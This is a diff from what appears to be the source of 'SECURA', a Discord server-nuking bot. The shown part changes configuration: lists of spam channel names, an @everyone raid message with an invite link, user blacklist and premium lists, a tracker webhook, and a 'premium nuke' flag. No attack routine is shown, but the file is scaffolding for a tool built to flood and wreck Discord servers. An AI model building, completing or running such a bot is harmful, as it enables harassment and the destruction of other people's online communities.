@@ -7,22 +7,23 @@ import asyncio
 from webserver import keep_alive
 import base64
 from typing import Optional
-token = "" # put ur token
 
+token = "" # put ur token
 
 SPAM_CHANNEL =  ["Secura runs you" , "Get Banned" , "NUKED" , "oops Secura","F IN CHAT SECURA","Should Have Listened","Get NUKED clowns","Nuked by SECURA ","oops got nuked","I run you","Nuked by SECURA","I run you","kinda got nuked by yourself"]
 DEFAULT_CHANNELS = ["Secura runs you", "Get Banned", "NUKED", "oops Secura", "F IN CHAT SECURA"]
 SPAM_MESSAGE = ["@everyone You Got Nuked by SECURA https://discord.gg/mAjwRqXAPp RIP 67 https://files.catbox.moe/3obb3d.mp4"]
 
+# data is stored in RAM and not actual files
 join_logs = []
 blacklisted_users = []
 premium_users = []
 premium_settings = {}
 trusted_servers = []
-log_channel_id = None
-icon_url = "https://perfect-salmon-ksgaqprzdx-wgvf57rmbw.edgeone.dev/Frame-2-1.png"
+log_channel_id = None # i don't know what this was used for
+icon_url = "" # put ur logo here
 bot_system_logs = []
-webhook_url = "" # webhook message
+webhook_url = "" # webhook for tracker channel
 current_spam_message = "@everyone You Got Nuked by SECURA https://discord.gg/mAjwRqXAPp RIP 67 https://files.catbox.moe/3obb3d.mp4"
 is_premium_nuke = False
 
